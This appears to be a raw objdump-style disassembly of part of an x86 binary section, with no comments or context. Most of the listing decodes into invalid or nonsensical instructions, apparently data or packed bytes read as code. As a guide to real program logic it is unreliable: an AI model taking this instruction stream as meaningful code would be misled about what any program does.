  40d7ef:	mov    eax,DWORD PTR [ecx]
  40d7f1:	cmp    DWORD PTR [ebp-0x72],eax
  40d7f4:	cld    
  40d7f5:	add    eax,0xc0cefa2b
  40d7fa:	adc    BYTE PTR [edx+0x64a433c5],cl
  40d800:	inc    esi
  40d801:	add    al,ch
  40d803:	pop    ebp
  40d804:	jmp    0x8df8:0x4213fffe
  40d80b:	inc    edi
  40d80c:	lds    ecx,FWORD PTR [esi-0x18]
  40d80f:	push   ds
  40d810:	in     eax,dx
  40d811:	(bad)  
  40d812:	(bad)  
  40d813:	std    
  40d814:	icebp  
  40d815:	adc    edi,edi
  40d817:	xchg   DWORD PTR [edx],ecx
  40d819:	push   DWORD PTR [ebp-0x3e]
  40d81c:	les    esi,FWORD PTR [ebx+0x8]
  40d81f:	mov    ds:0xff662e,al
	...
  40d830:	add    BYTE PTR [eax],al
  40d832:	popf   
  40d833:	or     al,al
  40d835:	movzx  ebp,BYTE PTR [edi]
  40d838:	(bad)  
  40d839:	dec    DWORD PTR [edx-0x3b]
  40d83c:	jae    0x40d84a
  40d83e:	ins    DWORD PTR es:[edi],dx
  40d83f:	repnz idiv edi
  40d842:	idiv   DWORD PTR [ecx-0x1a]
  40d845:	stc    
  40d846:	xlat   BYTE PTR ds:[ebx]
  40d847:	(bad)  
  40d848:	std    
  40d849:	mov    eax,edi
  40d84b:	or     DWORD PTR [ebx],edi
  40d84d:	inc    ebp
  40d84e:	arpl   WORD PTR [edi+ecx*1+0x2abc783],di
  40d855:	add    BYTE PTR [ecx+edi*1],al
  40d858:	pop    ss
  40d859:	push   DWORD PTR [esi-0x4c]
  40d85c:	stos   BYTE PTR es:[edi],al
  40d85d:	mov    eax,ds:0x88bfb37c
  40d862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d863:	mov    al,0xab
  40d865:	jae    0x40d84b
  40d867:	lock mov bh,0x2a
  40d86a:	mov    cl,0x36
  40d86c:	inc    esi
  40d86d:	hlt    
  40d86e:	int3   
  40d86f:	or     BYTE PTR [eax+0x65],ch
  40d872:	and    ch,BYTE PTR [ebx+ecx*1-0x5451b02e]
  40d879:	addr16 dec ecx
  40d87b:	lods   al,BYTE PTR ds:[esi]
  40d87c:	push   edx
  40d87d:	jmp    FWORD PTR [esi]
  40d87f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d880:	stos   BYTE PTR es:[edi],al
  40d881:	mov    BYTE PTR [edi+0x6b],al
  40d884:	mov    edi,0xbfb82efe
  40d889:	je     0x40d8f6
  40d88b:	xchg   esp,eax
  40d88c:	xor    esp,DWORD PTR [edi-0x6c]
  40d88f:	xchg   edx,eax
  40d890:	mov    edx,DWORD PTR [edi+esi*2+0x2f]
  40d894:	std    
  40d895:	inc    DWORD PTR [eax]
	...
  40d8a3:	add    BYTE PTR [eax],al
  40d8a5:	xrstor [ebx-0x481f15b9]
  40d8ac:	mov    ah,BYTE PTR [esi+0x48]
  40d8af:	sub    DWORD PTR [ecx+0x63],eax
  40d8b2:	das    
  40d8b3:	stos   BYTE PTR es:[edi],al
  40d8b4:	add    edx,DWORD PTR [edx]
  40d8b6:	and    esi,DWORD PTR [esi]
  40d8b8:	adc    al,0xb2
  40d8ba:	push   edi
  40d8bb:	ss clc 
  40d8bd:	push   esp
  40d8be:	fimul  DWORD PTR [edx]
  40d8c0:	call   0xff009849
  40d8c5:	stos   BYTE PTR es:[edi],al
  40d8c6:	mov    bl,0xc2
  40d8c8:	je     0x40d92b
  40d8ca:	push   ebx
  40d8cb:	out    0x50,al
  40d8cd:	xor    al,0x7a
  40d8cf:	mov    edx,0xaaeab6fe
  40d8d4:	jns    0x40d894
  40d8d6:	add    eax,0x331dc026
  40d8db:	sbb    eax,0x162190ab
  40d8e0:	ror    BYTE PTR [edi+0x5],0xe9
  40d8e4:	inc    ebx
  40d8e5:	pop    ebp
  40d8e6:	das    
  40d8e7:	jmp    0x40d895
  40d8e9:	test   BYTE PTR fs:[ebx-0x49],bh
  40d8ed:	hlt    
  40d8ee:	xor    DWORD PTR [edi-0x54],ebp
  40d8f1:	push   esp
  40d8f2:	mov    eax,0x3fcbf73
  40d8f7:	dec    ebp
  40d8f8:	mov    edi,0xc023c0dd
  40d8fd:	aam    0xb8
  40d8ff:	call   0xf583b107
  40d904:	mov    ah,0xb8
  40d907:	call   0x40d90f
	...
  40d918:	arpl   WORD PTR [eax+0x3abcbc33],di
  40d91e:	inc    ebp
  40d91f:	mov    edi,0xc0238cad
  40d924:	fwait
  40d925:	ret    
  40d926:	clc    
  40d927:	add    esi,DWORD PTR [esi]
  40d929:	mov    WORD PTR [edi+edx*2-0x7d1abd18],cs
  40d930:	int3   
  40d931:	or     eax,0x2907ac39
  40d936:	xchg   BYTE PTR [edi+0x397dbde9],bh
  40d93c:	addr16 mov ch,ch
  40d93f:	mov    esi,0x475e14f7
  40d944:	pop    edi
  40d945:	test   bl,ah
  40d947:	packsswb mm6,QWORD PTR [ecx]
  40d94a:	out    dx,al
  40d94b:	mov    esi,0x476409cf
  40d950:	pop    ebx
  40d951:	push   ebp
  40d952:	dec    esi
  40d953:	cmp    DWORD PTR [ebx-0x53],ebx
  40d956:	pop    edx
  40d957:	xor    BYTE PTR [eax+edi*4],bh
  40d95a:	jno    0x40d9a5
  40d95c:	dec    edi
  40d95d:	mov    ?,edi
  40d95f:	lock test al,0x5
  40d962:	add    cl,ch
  40d964:	pusha  
  40d965:	pop    eax
  40d966:	leave  
  40d967:	sub    esi,DWORD PTR [edi+0x5]
  40d96a:	push   ebp
  40d96b:	jb     0x40d940
  40d96d:	add    bl,0x1d
  40d970:	fcom   DWORD PTR [eax+0x14]
  40d973:	es popa 
  40d975:	add    eax,0xec60e900
  40d97a:	shl    esi,1
	...
  40d988:	add    BYTE PTR [eax],al
  40d98a:	add    BYTE PTR [ebx+0x60e90109],ch
  40d990:	add    eax,0x8321550f
  40d995:	jl     0x40d98c
  40d997:	pusha  
  40d998:	xor    dl,BYTE PTR [ebx]
  40d99a:	ficomp WORD PTR [ebx+0x7aea6a11]
  40d9a0:	add    eax,0x87f8e96a
  40d9a5:	inc    dh
  40d9a7:	std    
  40d9a8:	lods   al,BYTE PTR ds:[esi]
  40d9a9:	sub    bl,ch
  40d9ab:	pusha  
  40d9ac:	add    eax,0x6533483
  40d9b1:	jne    0x40d9bd
  40d9b3:	in     al,0x30
  40d9b5:	adc    BYTE PTR [esi-0x5317f2a5],ah
  40d9bb:	ds mov eax,0xb91b60fe
  40d9c1:	(bad)  
  40d9c2:	adc    al,0x6b
  40d9c4:	sub    eax,DWORD PTR [eax]
  40d9c6:	adc    ebp,DWORD PTR [ebx-0x76]
  40d9c9:	inc    esp
  40d9ca:	jge    0x40d9dc
  40d9cc:	lods   eax,DWORD PTR ds:[esi]
  40d9cd:	data16 jbe 0x40d97d
  40d9d0:	mov    dh,0xe8
  40d9d2:	jmp    0x6a40df39
  40d9d7:	mov    ds:0x41d40209,eax
  40d9dc:	mov    eax,0x320df974
  40d9e1:	or     BYTE PTR [ecx-0x73],al
  40d9e4:	pop    ds
  40d9e5:	inc    DWORD PTR [eax]
  40d9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e8:	mov    DWORD PTR [ebx-0x4],eax
  40d9eb:	jne    0x40d9ea
  40d9ed:	adc    ebp,DWORD PTR [edx+0x0]
	...
  40d9fc:	add    BYTE PTR [eax],al
  40d9fe:	cmp    ch,ch
  40da00:	add    ecx,DWORD PTR [ebp-0x17b18901]
  40da06:	add    al,0x78
  40da08:	std    
  40da09:	push   DWORD PTR [ebx-0x31]
  40da0c:	(bad)  
  40da0d:	(bad)  
  40da0e:	cli    
  40da0f:	cmp    DWORD PTR [ebx+0xc],0xfffffff9
  40da13:	std    
  40da14:	pop    ds
  40da15:	(bad)  
  40da16:	jg     0x40da2a
  40da18:	push   0x3
  40da1a:	cmc    
  40da1b:	out    dx,al
  40da1c:	pop    es
  40da1d:	call   0x3fbac0
  40da22:	cmc    
  40da23:	out    dx,al
  40da24:	adc    ebp,DWORD PTR [edx-0x37]
  40da27:	in     al,dx
  40da28:	jmp    FWORD PTR [ecx-0x36]
  40da2b:	push   0x16
  40da2d:	push   DWORD PTR [ebp-0x444e1888]
  40da33:	add    al,BYTE PTR [eax]
  40da35:	and    DWORD PTR [edi],0x15
  40da38:	add    al,0x75
  40da3a:	imul   edi,DWORD PTR [eax+0x73],0x7eef510
  40da41:	call   0x3fb93c
  40da46:	adc    edi,DWORD PTR [esi]
  40da48:	cld    
  40da49:	jmp    FWORD PTR [edi+0x1d]
  40da4c:	push   0x0
  40da4e:	pusha  
  40da4f:	or     eax,0x51d6458d
  40da54:	call   0xfdb9bf48
  40da59:	jmp    0x40dc50
  40da5e:	stc    
  40da5f:	cmc    
  40da60:	or     eax,DWORD PTR ds:0x0
	...
  40da6e:	add    BYTE PTR [eax],al
  40da70:	add    BYTE PTR [edi+0x11],ch
  40da73:	push   DWORD PTR [ebp+0x5a]
  40da76:	in     al,dx
  40da77:	add    eax,0xe80a2fff
  40da7c:	push   ebp
  40da7d:	arpl   si,ax
  40da7f:	mov    ebx,0x2ad0bfe
  40da84:	add    BYTE PTR [ebx+0x55],ah
  40da87:	sub    DWORD PTR [ecx],eax
  40da89:	arpl   WORD PTR [edi+edi*2+0x35a65f7c],bp
  40da90:	and    BYTE PTR [ecx+esi*2],ah
  40da93:	adc    ch,BYTE PTR [edx+0x6b]
  40da96:	fbstp  TBYTE PTR [esi]
  40da98:	or     BYTE PTR [ebx],cl
  40da9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da9b:	and    al,0xff
  40da9d:	or     al,0xf
  40da9f:	aaa    
  40daa0:	adc    al,0x79
  40daa2:	stos   DWORD PTR es:[edi],eax
  40daa3:	sub    BYTE PTR [eax],al
  40daa5:	mov    DWORD PTR [edx+ebp*4-0x44490a55],ebp
  40daac:	call   0x438857
  40dab1:	loopne 0x40dadb
  40dab3:	sysret 
  40dab5:	push   esi
  40dab6:	or     al,0xbd
  40dab8:	je     0x40db2d
  40daba:	push   edx
  40dabb:	or     al,0xff
  40dabd:	push   esi
  40dabe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dabf:	stos   BYTE PTR es:[edi],al
  40dac0:	adc    DWORD PTR ds:0x36febbc7,edi
  40dac6:	fsubr  DWORD PTR [eax]
  40dac8:	add    ecx,DWORD PTR [ecx-0x54]
  40dacb:	sub    BYTE PTR [eax],al
  40dacd:	mov    ebx,0xa4febd25
  40dad2:	les    ebx,FWORD PTR [ebx]
  40dad4:	add    DWORD PTR [eax],eax
	...
  40dae2:	add    BYTE PTR [eax],al
  40dae4:	arpl   WORD PTR [edi+edi*2+0x35b4677c],bp
  40daeb:	sbb    al,0xa4
  40daed:	call   0xabc5dab1
  40daf2:	add    bh,bh
  40daf4:	not    bh
  40daf6:	sub    BYTE PTR [eax],al
  40daf8:	or     DWORD PTR [eax+0x1b6f448d],esp
  40dafe:	lods   al,BYTE PTR ds:[esi]
  40daff:	arpl   WORD PTR [ebp+0x26],sp
  40db02:	mov    esp,0xe9065ee8
  40db07:	add    esp,DWORD PTR [ebx-0x78]
  40db0a:	fisttp DWORD PTR [edi]
  40db0c:	pop    edx
  40db0d:	cmp    dh,ch
  40db0f:	les    ebx,FWORD PTR [edi+0x6303e7b1]
  40db15:	add    eax,0x1f4f3646
  40db1a:	jmp    0xabc34248
  40db1f:	mov    edi,0xbdaa9d94
  40db24:	sbb    eax,0x14d80fb5
  40db29:	mov    ch,0xe8
  40db2b:	or     BYTE PTR [edi+0x5936e301],0x6d
  40db32:	call   0x10463e3a
  40db37:	enter  0xb4f4,0xe8
  40db3b:	sub    BYTE PTR [edi+0x1],0xe2
  40db3f:	ss pop ecx
  40db41:	ins    DWORD PTR es:[edi],dx
  40db42:	call   0xd0463e4a
  40db47:	jg     0x40db49
	...
  40db55:	add    BYTE PTR [eax],al
  40db57:	aam    0xb4
  40db59:	call   0xe5422ae4
  40db5e:	xor    eax,0x30bb002e
  40db63:	adc    al,BYTE PTR [esi+0x5630843]
  40db69:	sub    DWORD PTR [edx],eax
  40db6b:	xor    BYTE PTR ds:0x845731b6,bh
  40db71:	and    esi,DWORD PTR [eax+0x89d22e1]
  40db77:	mov    dl,0x22
  40db79:	xchg   ebp,eax
  40db7a:	mov    ebx,0x8680b917
  40db7f:	cli    
  40db80:	mov    bl,0x8d
  40db82:	lea    esp,[edi]
  40db84:	lods   eax,DWORD PTR ds:[esi]
  40db85:	test   DWORD PTR [ecx],esi
  40db87:	push   ebx
  40db88:	mov    ah,0xf3
  40db8a:	scas   eax,DWORD PTR es:[edi]
  40db8b:	ins    DWORD PTR es:[edi],dx
  40db8c:	cmp    al,BYTE PTR [eax]
  40db8e:	jno    0x40db38
  40db90:	cmp    DWORD PTR [eax],ecx
  40db92:	adc    edx,0x1866ff28
  40db98:	cmp    DWORD PTR [ebx+edx*8],edx
  40db9b:	data16 mov ah,0x74
  40db9e:	pop    ebp
  40db9f:	or     BYTE PTR [ecx],bh
  40dba1:	clc    
  40dba2:	inc    ecx
  40dba3:	push   ss
  40dba4:	mov    cl,0xfe
  40dba6:	inc    esi
  40dba7:	clc    
  40dba8:	cmp    al,bh
  40dbaa:	push   ecx
  40dbab:	sub    BYTE PTR [esi],bl
  40dbad:	push   DWORD PTR [esi]
  40dbaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbb0:	add    eax,0xa060e900
  40dbb5:	pop    edi
  40dbb6:	push   0x5a
  40dbb8:	add    DWORD PTR ds:0x9b,ecx
	...
  40dbca:	mov    bl,0x0
  40dbcc:	rcr    BYTE PTR [edi+ebp*4+0x60dd7c86],cl
  40dbd3:	add    eax,0x3d2def40
  40dbd8:	push   DWORD PTR [esp+eiz*2-0x7c]
  40dbdc:	inc    esp
  40dbdd:	std    
  40dbde:	frstor [eax]
  40dbe0:	hlt    
  40dbe1:	fdiv   QWORD PTR [edi-0x6c190be0]
  40dbe7:	mov    ecx,0xb47d06e7
  40dbec:	(bad)  
  40dbed:	pusha  
  40dbee:	and    ebp,DWORD PTR [ebp-0x4ba8ab02]
  40dbf4:	je     0x40dbb3
  40dbf6:	stc    
  40dbf7:	cmp    al,bh
  40dbf9:	mov    esi,0x13e7fd73
  40dbfe:	xor    DWORD PTR [esi+edi*8+0x6a1953ae],0xffffffe8
  40dc06:	fnstcw WORD PTR [eax]
  40dc08:	hlt    
  40dc09:	sahf   
  40dc0a:	push   ebx
  40dc0b:	lods   eax,DWORD PTR ds:[esi]
  40dc0c:	out    0x1f,eax
  40dc0e:	retf   0xfeb2
  40dc11:	mov    ?,WORD PTR [ebx]
  40dc13:	lods   eax,DWORD PTR ds:[esi]
  40dc14:	out    0x0,eax
  40dc16:	out    0xe0,al
  40dc18:	(bad)  
  40dc19:	jmp    DWORD PTR [edx]
  40dc1b:	or     DWORD PTR [eax],eax
  40dc1d:	add    BYTE PTR [edx+0x62],bh
  40dc20:	add    edi,DWORD PTR [eax+0x74a]
  40dc26:	xchg   ebx,eax
  40dc27:	enter  0xe,0x17
  40dc2b:	test   dl,ch
  40dc2d:	push   esi
	...
  40dc3a:	add    BYTE PTR [eax],al
  40dc3c:	add    BYTE PTR [ecx+0x170007ed],bh
  40dc42:	push   es
  40dc43:	pop    esi
  40dc44:	leave  
  40dc45:	mov    BYTE PTR [edx-0x1087502],dh
  40dc4b:	jmp    0x23b9:0xe6b46d0a
  40dc52:	jo     0x40dc51
  40dc54:	add    DWORD PTR [edx+esi*4-0x7f],0x3e
  40dc59:	cli    
  40dc5a:	cmc    
  40dc5b:	lock jmp edi
  40dc5e:	(bad)  
  40dc5f:	out    0xa9,eax
  40dc61:	jecxz  0x40dcd2
  40dc63:	std    
  40dc64:	pop    esi
  40dc65:	xor    ecx,eax
  40dc67:	add    al,BYTE PTR [eax]
  40dc69:	xlat   BYTE PTR ds:[ebx]
  40dc6a:	sub    edx,0xffffff8b
  40dc6d:	mov    bh,0xfe
  40dc6f:	mov    dl,BYTE PTR [ebp-0x42]
  40dc72:	add    DWORD PTR [edx],0xffffff90
  40dc75:	dec    ecx
  40dc76:	cli    
  40dc77:	(bad)  
  40dc79:	ss add al,0x8b
  40dc7c:	push   ebp
  40dc7d:	retf   0x2e6d
  40dc80:	(bad)
  40dc84:	adc    al,0xca
  40dc86:	loop   0x40dc8f
  40dc88:	mov    edx,DWORD PTR [edi+0x15]
  40dc8b:	push   DWORD PTR [eax-0x4a]
  40dc8e:	jge    0x40dc90
  40dc90:	or     DWORD PTR [edi+0x11],0x0
  40dc94:	je     0x40dc29
  40dc96:	adc    DWORD PTR [ebx+0x18],0x83007c4a
  40dc9d:	arpl   WORD PTR [esi+0xc90a],bx
	...
  40dcaf:	add    BYTE PTR [ecx-0x17aafd48],ah
  40dcb5:	cwde   
  40dcb6:	test   bl,al
  40dcb8:	(bad)  
  40dcb9:	sbb    edx,DWORD PTR [edx-0x75]
  40dcbc:	push   ds
  40dcbd:	int3   
  40dcbe:	mov    edi,0x29c5cff
  40dcc3:	add    al,ch
  40dcc5:	pusha  
  40dcc6:	push   es
  40dcc7:	(bad)  
  40dcc8:	arpl   WORD PTR [edx+eax*1+0x371f6300],bx
  40dccf:	or     BYTE PTR [ebx-0x27],ah
  40dcd2:	or     ch,BYTE PTR [ebx]
  40dcd4:	and    ebp,DWORD PTR [edx+0x57]
  40dcd7:	leave  
  40dcd8:	and    DWORD PTR [eax-0x5b5100fe],esp
  40dcde:	stos   BYTE PTR es:[edi],al
  40dcdf:	inc    DWORD PTR [ebx+0x230ab8e3]
  40dce5:	xchg   ecx,eax
  40dce6:	or     ch,BYTE PTR [ebx]
  40dce8:	and    esi,DWORD PTR [edx+0x57]
  40dceb:	leave  
  40dcec:	and    DWORD PTR [eax+0x14a68902],ebp
  40dcf2:	mov    ecx,0xe146b74
  40dcf7:	arpl   sp,bp
  40dcf9:	mov    dl,0xbf
  40dcfb:	inc    esp
  40dcfc:	out    dx,eax
  40dcfd:	pushf  
  40dcfe:	add    al,BYTE PTR [eax]
  40dd00:	arpl   WORD PTR [ecx+0x3f],dx
  40dd03:	in     al,dx
  40dd04:	xor    edi,DWORD PTR [ecx]
  40dd06:	ds hlt 
  40dd08:	xor    edx,ebx
  40dd0a:	sub    eax,0xbc72bb08
  40dd0f:	(bad)  
  40dd10:	mov    esp,0xec3f14
	...
  40dd21:	add    BYTE PTR [eax],al
  40dd23:	sub    al,0xb6
  40dd25:	cmp    DWORD PTR [edi+esi*4-0x65],0x2e
  40dd2a:	add    al,0x58
  40dd2c:	mov    gs,WORD PTR [esi]
  40dd2e:	or     BYTE PTR [eax+0x5c],cl
  40dd31:	pop    eax
  40dd32:	pop    edi
  40dd33:	stos   BYTE PTR es:[edi],al
  40dd34:	add    al,0xab
  40dd36:	pop    es
  40dd37:	arpl   si,bx
  40dd39:	and    ebp,DWORD PTR [eax-0x7d7eb825]
  40dd3f:	call   FWORD PTR [eax+ebp*8-0xfb3cfd]
  40dd46:	or     edi,DWORD PTR [eax]
  40dd48:	lds    ebx,FWORD PTR [esi]
  40dd4a:	pop    ecx
  40dd4b:	call   0x814a:0xe803e4c6
  40dd52:	ret    0x434
  40dd55:	mov    ecx,0x5e1e3bab
  40dd5a:	mov    eax,0x8c554adb
  40dd5f:	xor    al,0xc9
  40dd61:	mov    ds:0xe8b1349f,eax
  40dd66:	add    edi,DWORD PTR [eax]
  40dd68:	cmc    
  40dd69:	imul   edi,DWORD PTR [esi],0x33
  40dd6c:	push   esi
  40dd6d:	fs ds pop ss
  40dd70:	push   esi
  40dd71:	cs imul ebx,DWORD PTR cs:[ebp-0x4ef2425b],0x71
  40dd7a:	inc    esi
  40dd7b:	adc    ebp,ebp
  40dd7d:	mov    ds:0xe20975ab,eax
  40dd82:	aad    0x70
  40dd84:	adc    eax,0x2e06
	...
  40dd95:	add    bh,ch
  40dd97:	popf   
  40dd98:	dec    eax
  40dd99:	sub    esp,esp
  40dd9b:	mov    al,0xc1
  40dd9d:	ret    
  40dd9e:	ds push eax
  40dda0:	and    ch,al
  40dda2:	push   0xbb491005
  40dda7:	mov    al,0x23
  40dda9:	mov    al,ds:0xac5384f9
  40ddae:	mov    esp,0x3782e73a
  40ddb3:	mov    ecx,0x84a230e8
  40ddb8:	cmp    ebp,DWORD PTR [esp+eiz*4-0x1e10ffc7]
  40ddbf:	xor    esp,esi
  40ddc1:	jmp    0x1d3ff319
  40ddc6:	retf   
  40ddc7:	test   al,0x70
  40ddc9:	adc    esp,ecx
  40ddcb:	scas   eax,DWORD PTR es:[edi]
  40ddcc:	sub    ch,BYTE PTR [ecx-0x5436afeb]
  40ddd2:	imul   eax,DWORD PTR ds:0xb0c30483,0x73
  40ddd9:	in     al,0xb7
  40dddb:	jnp    0x40dddc
  40dddd:	call   0xd9855a42
  40dde2:	or     eax,0x6776e439
  40dde7:	jl     0x40de2d
  40dde9:	inc    ebp
  40ddea:	push   ds
  40ddeb:	rol    BYTE PTR [ecx],1
  40dded:	mov    ecx,0x4e682508
  40ddf2:	in     al,dx
  40ddf3:	jl     0x40de39
  40ddf5:	and    eax,0x72dc30d8
	...
  40de06:	add    BYTE PTR [eax],al
  40de08:	add    BYTE PTR [edx-0x4f],dh
  40de0b:	jmp    0xa226:0xcf7b8b91
  40de12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de13:	(bad)  
  40de14:	call   0xa4cde379
  40de19:	sar    BYTE PTR [edi],0x8d
  40de1c:	lods   al,BYTE PTR ds:[esi]
  40de1d:	int3   
  40de1e:	aas    
  40de1f:	push   edx
  40de20:	push   cs
  40de21:	xor    bh,ch
  40de23:	out    0x16,eax
  40de25:	test   al,0xae
  40de27:	(bad)  
  40de28:	repnz and BYTE PTR [esp+ecx*1],dh
  40de2c:	push   0xffffff9a
  40de2e:	mov    ecx,0x82d674ff
  40de33:	jl     0x40ddfe
  40de35:	pusha  
  40de36:	cmp    ah,BYTE PTR [esi]
  40de38:	push   0xffffff8b
  40de3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de3b:	call   FWORD PTR [edi+ebp*2-0x50]
  40de3f:	je     0x40de0a
  40de41:	or     BYTE PTR [edx],cl
  40de43:	push   0xfd76a500
  40de48:	jne    0x40de10
  40de4a:	pop    ebx
  40de4b:	sub    dh,bh
  40de4d:	aad    0x76
  40de4f:	std    
  40de50:	jne    0x40de18
  40de52:	pop    ebx
  40de53:	hlt    
  40de54:	lds    esi,FWORD PTR [bp+0x29]
  40de58:	rol    BYTE PTR [eax+ebx*2-0x37],0xc2
  40de5d:	xchg   BYTE PTR [ebx],al
  40de5f:	mov    eax,DWORD PTR [ebp-0x16]
  40de62:	sbb    bh,dh
  40de64:	dec    ebp
  40de65:	fiadd  WORD PTR [edx-0x20851b85]
  40de6b:	add    eax,0x83
	...
  40de7c:	push   edi
  40de7d:	pop    edi
  40de7e:	(bad)  
  40de7f:	je     0x40de27
  40de81:	jnp    0x40dec6
  40de83:	or     al,0xc5
  40de85:	cmc    
  40de86:	fisttp DWORD PTR [edi-0x38c87c6]
  40de8c:	mov    ds:0xa5ff65bb,al
  40de91:	sub    al,BYTE PTR [eax]
  40de93:	add    BYTE PTR [edx],bh
  40de95:	add    ebx,DWORD PTR [esi+0x5f]
  40de98:	jae    0x40de5e
  40de9a:	or     al,BYTE PTR [eax]
  40de9c:	(bad)  
  40de9d:	jnp    0x40de89
  40de9f:	cmp    DWORD PTR [esi],0xffffffba
  40dea2:	push   ebp
  40dea3:	add    edi,0x12
  40dea6:	add    BYTE PTR [ebp+0x10],dh
  40dea9:	sub    eax,DWORD PTR [eax]
  40deab:	add    BYTE PTR [edx],cl
  40dead:	add    ebx,DWORD PTR [edi-0x37]
  40deb0:	dec    eax
  40deb1:	(bad)  
  40deb2:	(bad)  
  40deb3:	(bad)  
  40deb4:	mov    bh,0x12
  40deb6:	sub    edx,edx
  40deb8:	jno    0x40deff
  40deba:	adc    bh,dh
  40debc:	scas   eax,DWORD PTR es:[edi]
  40debd:	dec    esi
  40debe:	gs inc ecx
  40dec0:	retf   0x4381
  40dec3:	lock xor BYTE PTR [ecx],cl
  40dec6:	push   DWORD PTR [ebp-0x56]
  40dec9:	js     0x40df3e
  40decb:	or     BYTE PTR [ebx-0x3c],ah
  40dece:	sbb    DWORD PTR [edi-0x4c],ebx
  40ded1:	mov    edi,0x9c537c80
  40ded6:	sub    eax,0x289d390c
  40dedb:	fs pushf 
  40dedd:	icebp  
  40dede:	or     ebp,eax
	...
  40deec:	add    BYTE PTR [eax],al
  40deee:	add    BYTE PTR [ebx-0x1],ch
  40def1:	mov    ah,0xfe
  40def3:	mov    WORD PTR [ecx],ss
  40def5:	adc    bh,bh
  40def7:	push   cs
  40def8:	mov    ah,0xaa
  40defa:	dec    edx
  40defb:	add    DWORD PTR [edi-0x7fe1774c],edx
  40df01:	mov    ah,0x74
  40df03:	push   edi
  40df04:	xchg   DWORD PTR [esi],ebp
  40df06:	or     BYTE PTR [ebx-0x34],bh
  40df09:	and    bh,bh
  40df0b:	pop    esp
  40df0c:	aaa    
  40df0d:	das    
  40df0e:	adc    al,0x54
  40df10:	mov    ecx,0xba66e80a
  40df15:	mov    bl,0xfe
  40df17:	fisubr DWORD PTR [eax-0x46]
  40df1a:	(bad)  
  40df1b:	mov    dh,0xb0
  40df1d:	mov    bl,0x74
  40df1f:	imul   eax,DWORD PTR [ebp+ebp*4+0x60],0x2c
  40df24:	inc    edi
  40df25:	mov    ch,0x74
  40df27:	dec    edi
  40df28:	out    dx,eax
  40df29:	or     BYTE PTR cs:[ebx],cl
  40df2c:	aad    0x20
  40df2e:	call   DWORD PTR [ebx+eiz*1]
  40df31:	aas    
  40df32:	adc    al,0xe0
  40df34:	mov    ds:0x1b577402,eax
  40df39:	aaa    
  40df3a:	cld    
  40df3b:	outs   dx,BYTE PTR ds:[esi]
  40df3c:	nop
  40df3d:	add    eax,0xff007683
  40df42:	jae    0x40dfa8
  40df44:	rol    edx,cl
  40df46:	pop    esi
  40df47:	sbb    bl,dl
  40df49:	sldt   WORD PTR [edx]
  40df4c:	inc    eax
  40df4d:	push   ds
  40df4e:	inc    ecx
  40df4f:	arpl   WORD PTR ds:0x38ac,cx
	...
  40df61:	add    BYTE PTR [esi],ah
  40df63:	add    eax,0xda5c2de1
  40df68:	test   al,0x54
  40df6a:	stos   BYTE PTR es:[edi],al
  40df6b:	ret    0x3fc
  40df6e:	loopne 0x40df9f
  40df70:	int    0xfe
  40df72:	aaa    
  40df73:	inc    ebp
  40df75:	cs dec edi
  40df77:	scas   al,BYTE PTR es:[edi]
  40df78:	xor    ecx,DWORD PTR [ebx+ecx*4]
  40df7b:	add    DWORD PTR [edi-0x4b],0xffffff95
  40df7f:	jnp    0x40dfa4
  40df81:	int3   
  40df82:	add    al,0x5
  40df84:	jmp    0xe5de428b
  40df89:	sbb    al,0x7c
  40df8b:	lods   eax,DWORD PTR ds:[esi]
  40df8c:	pop    edi
  40df8d:	outs   dx,DWORD PTR ds:[esi]
  40df8f:	(bad)  [ebp-0x451ad58]
  40df95:	pcmpgtb mm6,QWORD PTR [edi]
  40df98:	icebp  
  40df99:	stos   DWORD PTR es:[edi],eax
  40df9a:	out    dx,al
  40df9b:	es jbe 0x40df52
  40df9e:	jmp    0x60cb54f5
  40dfa3:	outs   dx,DWORD PTR ds:[esi]
  40dfa4:	lods   eax,DWORD PTR ds:[esi]
  40dfa5:	clc    
  40dfa6:	(bad)  
  40dfa7:	lods   eax,DWORD PTR ds:[esi]
  40dfa8:	fisubr DWORD PTR [edx-0x7f02bd17]
  40dfae:	ins    BYTE PTR es:[edi],dx
  40dfaf:	add    eax,0x332c04d4
  40dfb4:	cmp    eax,0x3e2422ab
  40dfb9:	mov    ah,0x49
  40dfbb:	lds    edx,FWORD PTR [ebp-0x16eddd36]
  40dfc1:	or     BYTE PTR [edi+0x4eba9],0x0
	...
  40dfd4:	add    dh,bl
  40dfd6:	fs call 0x162142df
  40dfdc:	test   al,0x86
  40dfde:	xor    BYTE PTR [ebx+0x4301d9af],0x0
  40dfe5:	sahf   
  40dfe6:	mov    ch,0x92
  40dfe8:	add    esi,DWORD PTR [ebx]
  40dfea:	lods   al,BYTE PTR ds:[esi]
  40dfeb:	(bad)  
  40dfec:	jnp    0x40e056
  40dfee:	popf   
  40dfef:	daa    
  40dff0:	(bad)  
  40dff1:	pop    ss
  40dff2:	lods   al,BYTE PTR ds:[esi]
  40dff3:	(bad)  
  40dff4:	pop    esp
  40dff5:	imul   ebp,DWORD PTR [esp+esi*2+0x6116d8f1],0xffffffd6
  40dffd:	lock jge 0x40e044
  40e000:	popf   
  40e001:	dec    ebp
  40e002:	add    eax,0xac4b3cff
  40e007:	je     0x40dffa
  40e009:	clc    
  40e00a:	cmp    eax,0x7fd0b6f8
  40e00f:	dec    esp
  40e010:	aad    0xe5
  40e012:	in     eax,dx
  40e013:	call   FWORD PTR [ebx]
  40e015:	pusha  
  40e016:	lods   al,BYTE PTR ds:[esi]
  40e017:	je     0x40dfae
  40e019:	fistp  WORD PTR [edx]
  40e01b:	xchg   si,ax
  40e01d:	mov    al,0xdf
  40e01f:	mov    edi,0x13c6ae2e
  40e024:	jmp    0x7e5911da
  40e029:	call   0x74ab:0x14fcff11
  40e030:	fst    QWORD PTR [ecx]
  40e032:	xor    DWORD PTR [eax],ecx
  40e034:	push   ecx
  40e035:	in     al,dx
  40e036:	test   eax,0x5efe
	...
  40e047:	add    BYTE PTR [esp+ebp*2],bh
  40e04a:	je     0x40e032
  40e04c:	icebp  
  40e04d:	xor    ah,dh
  40e04f:	inc    ecx
